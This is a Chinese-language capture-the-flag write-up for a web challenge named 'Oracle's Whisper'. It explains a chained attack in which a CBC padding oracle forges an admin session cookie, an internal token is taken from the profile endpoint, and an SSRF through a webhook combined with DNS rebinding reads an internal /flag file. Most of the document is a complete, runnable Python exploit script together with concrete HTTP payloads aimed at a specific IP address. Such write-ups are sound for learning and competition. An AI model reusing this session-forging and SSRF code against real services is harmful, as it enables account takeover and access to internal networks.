# Oracle's Whisper

## 题目信息

- 题目名：Oracle's Whisper
- 类型：Web
- 目标：`http://39.105.213.28:12605`

## 题目概览

这题的核心不是 GraphQL，也不是普通登录绕过，而是一条比较完整的组合利用链：

1. `POST /api/session/decrypt` 存在明显的 CBC Padding Oracle。
2. 利用 Padding Oracle 伪造管理员 `session`。
3. 用伪造出的管理员会话访问 `GET /api/profile`，拿到 `internal_token`。
4. 再调用 `POST /api/webhook/test`，配合 DNS rebinding 访问内网接口，最终读取 `/flag`。

实战中最关键的是第二步：一旦能够离线伪造任意明文的会话，后面的管理员身份和内部接口都只是顺着走。

## 一、信息收集

访问首页可以看到几个明显提示：

```html
<p>API surfaces: <code>/graphql</code>, <code>/login</code>, <code>/api/profile</code></p>
<!-- TODO: review filter parsing before public release -->
```

继续查看 `robots.txt`：

```text
User-agent: *
Disallow: /api/session/
Disallow: /api/users/
Disallow: /api/webhook/
Disallow: /graphql
# graphql introspection disabled per security review (PROD-2024-Q3)
```

这里至少暴露了几个值得重点关注的接口：

- `/graphql`
- `/api/session/`
- `/api/users/`
- `/api/webhook/`
- `/api/profile`

其中真正打通利用链的关键是 `/api/session/decrypt`、`/api/profile` 和 `/api/webhook/test`。

## 二、确认 Padding Oracle

### 1. 观察 `/api/session/decrypt`

向该接口发送随机构造的 token，会发现响应状态并不统一。

例如发送明显非法的 token：

```http
POST /api/session/decrypt HTTP/1.1
Host: 39.105.213.28:12605
Content-Type: application/json

{"token":"AA"}
```

返回：

```http
HTTP/1.1 400 BAD REQUEST

{"error":"padding"}
```

这说明服务端会先对 token 进行 CBC 解密，再检查 PKCS#7 padding。

### 2. 为什么这就是 Oracle

如果一个接口把“padding 正确”和“padding 错误”区分开返回，那么它就已经是标准 Padding Oracle。

在本题里，正确的判定标准不是“返回 200”，而是：

- `400 {"error":"padding"}`：padding 错误
- `422 {"error":"decode"}` 或其他非 `400`：padding 正确，但明文内容可能无法解析

这一点非常关键。  
我在实际复现时对某个随机目标块爆破最后一个字节，256 个猜测里会出现唯一一个非 `400` 的值，状态码为 `422`，这正是可利用的 oracle 信号。

## 三、利用原理

### 1. CBC 解密公式

设密文分组为：

```text
C0 | C1 | C2 | ... | Cn
```

CBC 解密后第 `i` 个明文分组满足：

```text
Pi = D(Ci) xor C(i-1)
```

如果我们能够通过 Padding Oracle 求出某个目标块的中间值：

```text
Ii = D(Ci)
```

那么就可以直接构造前一个分组：

```text
C(i-1) = Ii xor Pi
```

也就是说，只要我们能恢复目标密文块的中间值，就可以让它解密成任意想要的明文块。

### 2. 这题的构造方式

我们要伪造的会话明文是：

```json
{"user":"oracle","role":"admin"}
```

对它做 PKCS#7 padding 后，按 16 字节分块。

接着采用经典“从后往前逆推”的方式：

1. 随机生成最后一个密文块 `Cn`
2. 用 Oracle 恢复 `In = D(Cn)`
3. 令 `C(n-1) = In xor Pn`
4. 再把 `C(n-1)` 当作新的目标块，恢复 `I(n-1)`
5. 令 `C(n-2) = I(n-1) xor P(n-1)`
6. 重复直到最前面

最终把所有块拼起来，就得到一个能被服务端解密为指定 JSON 的合法 `session`。

## 四、伪造管理员会话

脚本里核心的两个函数分别是：

- `oracle()`：调用 `/api/session/decrypt`，用是否为 `400` 判断 padding 对错
- `recover_intermediate()`：逐字节恢复目标块的中间值 `D(Ci)`

关键逻辑如下：

```python
for pad in range(1, 17):
    idx = 16 - pad
    for guess in range(256):
        for j in range(idx + 1, 16):
            forged[j] = dec[j] ^ pad
        forged[idx] = guess
        if not self.oracle(bytes(forged) + target_block):
            continue
        dec[idx] = guess ^ pad
        break
```

这里的含义很直接：

1. 先从最后一个字节开始爆破
2. 当某次猜测让 padding 变为合法时，就能恢复目标块对应字节的中间值
3. 重复 16 次，即可恢复整个块的中间值

再结合：

```python
cipher_blocks[idx] = xor_bytes(dec, blocks[idx])
```

就能把目标明文块反推出前一个密文块。

## 五、拿到管理员内部资料

伪造出 `session` 后，直接访问：

```http
GET /api/profile HTTP/1.1
Host: 39.105.213.28:12605
Cookie: session=<forged_admin_session>
```

在本次复现中返回：

```json
{
  "email": "oracle@oracle.local",
  "internal_endpoint": "http://internal-api:6000/cache/template",
  "internal_token": "0ce471fa7d5f430dcfd6318ce20e3558",
  "role": "admin",
  "session_clue": "Sessions are AES-CBC with a server-fixed IV.",
  "uid": "oracle"
}
```

这里最重要的是：

- `internal_token`
- `internal_endpoint`

这已经把最后一跳 SSRF 所需的信息基本都给全了。

## 六、SSRF + DNS Rebinding 读取 Flag

最后调用：

```http
POST /api/webhook/test HTTP/1.1
Host: 39.105.213.28:12605
Content-Type: application/json
Cookie: session=<forged_admin_session>

{
  "url": "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag",
  "method": "GET",
  "headers": {
    "X-Internal-Token": "<internal_token>"
  }
}
```

这里的利用点是：

- 外部看上去访问的是 `rbndr.us` 域名
- 实际通过 DNS rebinding 让目标主机在后续解析时命中 `127.0.0.1`
- 从而访问内网服务 `:6000/cache/template?name=/flag`

由于 rebinding 不一定第一次就成功，所以脚本里会自动重试多次。

在本次实跑中，前两次返回 `403`，第三次命中，返回内容为：

```json
{"content": "ISCC{PnHCWSSKcJBm5M6ssZXV}", "name": "/flag"}
```

最终得到 flag：

```text
ISCC{PnHCWSSKcJBm5M6ssZXV}
```

## 七、完整利用脚本

完整脚本见：

- [solve_oracle_whisper.py](/E:/CTFstudy/这是ISCC区域赛/WEB/oracle_whisper/solve_oracle_whisper.py)

运行方式：

```powershell
& 'C:\Users\ROG\.cache\codex-runtimes\codex-primary-runtime\dependencies\python\python.exe' .\WEB\oracle_whisper\solve_oracle_whisper.py
```

脚本会自动完成以下流程：

1. 调用 Padding Oracle 逆推中间值
2. 伪造管理员 `session`
3. 调用 `/api/profile` 提取 `internal_token`
4. 循环请求 `/api/webhook/test`
5. 命中 rebinding 后提取 `ISCC{...}`
6. 将结果保存到 `artifacts/flag.txt`

## 八、完整脚本正文

```python
#!/usr/bin/env python3
"""Oracle's Whisper solve script.

利用链：
1. /api/session/decrypt 存在 CBC Padding Oracle。
2. 通过倒推中间值伪造 admin session。
3. 使用 admin session 访问 /api/profile 获取 internal_token。
4. 借助 /api/webhook/test + DNS rebinding 访问内网 /flag。
"""
import argparse
import base64
import json
import os
import re
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path


BLOCK = 16
DEFAULT_BASE = "http://39.105.213.28:12605"
DEFAULT_WEBHOOK_URL = "http://7f000001.01010101.rbndr.us:6000/cache/template?name=/flag"
FLAG_RE = re.compile(r"ISCC\{[^}\r\n]{1,256}\}")


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def xor_bytes(left: bytes, right: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(left, right))


class Client:
    def __init__(self, base: str, timeout: int = 10, retries: int = 3, retry_sleep: float = 0.8) -> None:
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.retries = retries
        self.retry_sleep = retry_sleep

    def request(self, method: str, path: str, *, body: bytes | None = None, headers: dict | None = None) -> tuple[int, dict, bytes]:
        req = urllib.request.Request(
            self.base + path,
            data=body,
            method=method,
            headers=headers or {},
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.getcode(), dict(resp.info().items()), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers.items()), exc.read()

    def post_json(self, path: str, payload: dict, extra_headers: dict | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)
        return self.request("POST", path, body=json.dumps(payload, ensure_ascii=False).encode(), headers=headers)

    def get(self, path: str, cookie: str | None = None) -> tuple[int, dict, bytes]:
        headers = {
            "User-Agent": "oracle-whisper-solve/1.0",
            "Connection": "close",
        }
        if cookie:
            headers["Cookie"] = cookie
        return self.request("GET", path, headers=headers)

    def oracle(self, blob: bytes) -> bool:
        # 该接口的关键差异是：
        # 400 -> padding 错误
        # 422/200/... -> padding 正确，只是明文未必能被成功解码
        token = b64url_encode(blob)
        payload = {"token": token}
        for attempt in range(self.retries):
            code, _, _ = self.post_json("/api/session/decrypt", payload)
            if code == 429:
                time.sleep(self.retry_sleep * (attempt + 1))
                continue
            return code != 400
        raise RuntimeError("oracle hit rate limiting too many times")

    def recover_intermediate(self, target_block: bytes) -> bytes:
        if len(target_block) != BLOCK:
            raise ValueError("target block must be 16 bytes")

        # dec[i] = D_k(target_block)[i]
        dec = bytearray(BLOCK)
        forged = bytearray(BLOCK)
        for pad in range(1, BLOCK + 1):
            idx = BLOCK - pad
            for guess in range(256):
                for j in range(idx + 1, BLOCK):
                    forged[j] = dec[j] ^ pad
                forged[idx] = guess
                if not self.oracle(bytes(forged) + target_block):
                    continue
                dec[idx] = guess ^ pad
                break
            else:
                raise RuntimeError(f"failed to recover byte at pad={pad}")
            print(f"[oracle] recovered {pad:02d}/16 bytes for current block", flush=True)
        return bytes(dec)

    def forge_session(self, plaintext: bytes) -> str:
        if len(plaintext) % BLOCK != 0:
            raise ValueError("plaintext must be padded to a multiple of 16 bytes")

        blocks = [plaintext[i : i + BLOCK] for i in range(0, len(plaintext), BLOCK)]
        cipher_blocks = [b""] * (len(blocks) + 1)
        cipher_blocks[-1] = os.urandom(BLOCK)

        # 从最后一个密文块开始逆推：
        # 如果知道 I_i = D_k(C_i)，则只需设置 C_{i-1} = I_i xor P_i
        for idx in range(len(blocks) - 1, -1, -1):
            dec = self.recover_intermediate(cipher_blocks[idx + 1])
            cipher_blocks[idx] = xor_bytes(dec, blocks[idx])

        token = b"".join(cipher_blocks)
        return b64url_encode(token)

    def fetch_profile(self, token: str) -> dict:
        code, _, raw = self.get("/api/profile", cookie=f"session={token}")
        if code != 200:
            raise RuntimeError(f"/api/profile returned {code}: {raw.decode('utf-8', 'replace')}")
        return json.loads(raw.decode("utf-8", "replace"))

    def trigger_webhook(self, token: str, internal_token: str, url: str) -> tuple[int, dict, bytes]:
        payload = {
            "url": url,
            "method": "GET",
            "headers": {"X-Internal-Token": internal_token},
        }
        return self.post_json("/api/webhook/test", payload, extra_headers={"Cookie": f"session={token}"})


def pkcs7_pad(data: bytes, block_size: int = BLOCK) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0:
        pad_len = block_size
    return data + bytes([pad_len]) * pad_len


def parse_webhook_response(raw: bytes) -> str:
    text = raw.decode("utf-8", "replace")
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        return text
    body = data.get("body", "")
    if isinstance(body, dict):
        return json.dumps(body, ensure_ascii=False)
    if isinstance(body, str):
        try:
            nested = json.loads(body)
        except json.JSONDecodeError:
            return body
        if isinstance(nested, dict):
            return json.dumps(nested, ensure_ascii=False)
        return body
    return text


def extract_flag(text: str) -> str | None:
    match = FLAG_RE.search(text)
    if match:
        return match.group(0)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Reproduce Oracle's Whisper with a CBC padding oracle")
    parser.add_argument("--base", default=DEFAULT_BASE, help="challenge base URL")
    parser.add_argument("--webhook-url", default=DEFAULT_WEBHOOK_URL, help="internal webhook URL used for flag extraction")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
    parser.add_argument("--retries", type=int, default=3, help="oracle retry count on 429")
    parser.add_argument("--retry-sleep", type=float, default=0.8, help="sleep between oracle retries")
    parser.add_argument("--artifacts-dir", default=str(Path(__file__).resolve().parent / "artifacts"), help="output directory")
    parser.add_argument("--attempts", type=int, default=24, help="webhook retries")
    args = parser.parse_args()

    artifacts_dir = Path(args.artifacts_dir)
    artifacts_dir.mkdir(parents=True, exist_ok=True)

    client = Client(args.base, timeout=args.timeout, retries=args.retries, retry_sleep=args.retry_sleep)

    # 题目实际接受的会话 JSON 为：
    # {"user":"oracle","role":"admin"}
    plaintext = pkcs7_pad(b'{"user":"oracle","role":"admin"}')
    print("[+] forging admin session", flush=True)
    token = client.forge_session(plaintext)
    (artifacts_dir / "admin_token.txt").write_text(token + "\n", encoding="utf-8")

    profile = client.fetch_profile(token)
    (artifacts_dir / "profile.json").write_text(json.dumps(profile, ensure_ascii=False, indent=2), encoding="utf-8")

    internal_token = profile.get("internal_token")
    if not internal_token:
        raise RuntimeError("internal_token missing from /api/profile")

    print(f"[+] admin token: {token}")
    print(f"[+] internal token: {internal_token}")

    for attempt in range(1, args.attempts + 1):
        code, _, raw = client.trigger_webhook(token, internal_token, args.webhook_url)
        text = parse_webhook_response(raw)
        (artifacts_dir / f"webhook_attempt_{attempt}.txt").write_text(text, encoding="utf-8")
        flag = extract_flag(text)
        if code == 200 and flag:
            (artifacts_dir / "flag.txt").write_text(flag + "\n", encoding="utf-8")
            print(flag)
            return 0
        print(f"[-] attempt {attempt}: status={code}")
        time.sleep(1)

    print("[-] flag not found; try running again", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## 九、脚本输出文件

脚本运行后会在 `artifacts` 目录下生成：

- `admin_token.txt`：伪造出的管理员 session
- `profile.json`：管理员资料与 `internal_token`
- `webhook_attempt_*.txt`：每次 webhook 请求的返回
- `flag.txt`：最终 flag

## 十、复现中的坑点

### 1. Oracle 成功条件不是 200

这题最容易踩坑的地方是把“成功”误判成 `200 OK`。  
实际上只要不是 `400 padding`，就代表 padding 已经正确。

### 2. `/login` 不是必要路径

这次复现时，`POST /login` 直接返回：

```json
{"error":"rate limited"}
```

所以实际利用完全不依赖登录接口。  
真正核心是伪造会话，而不是拿现成账户。

### 3. DNS Rebinding 需要重试

`rbndr.us` 这一跳不是每次都直接命中本地回环地址，所以 webhook 可能前几次只返回 `403`。  
脚本里加入循环重试即可。

## 十一、总结

这题本质上是三类问题的串联：

1. 不安全的加密会话设计
2. 暴露了解密错误差异，形成 Padding Oracle
3. 内部 webhook 可带自定义 Header，最终形成 SSRF 读内网文件

真正决定题目难度的点，是能否快速识别 `/api/session/decrypt` 的响应差异并把它转化为“任意明文会话伪造”。  
一旦 session 可以伪造，后面的 `internal_token` 和 webhook 都只是顺着业务链路取值。
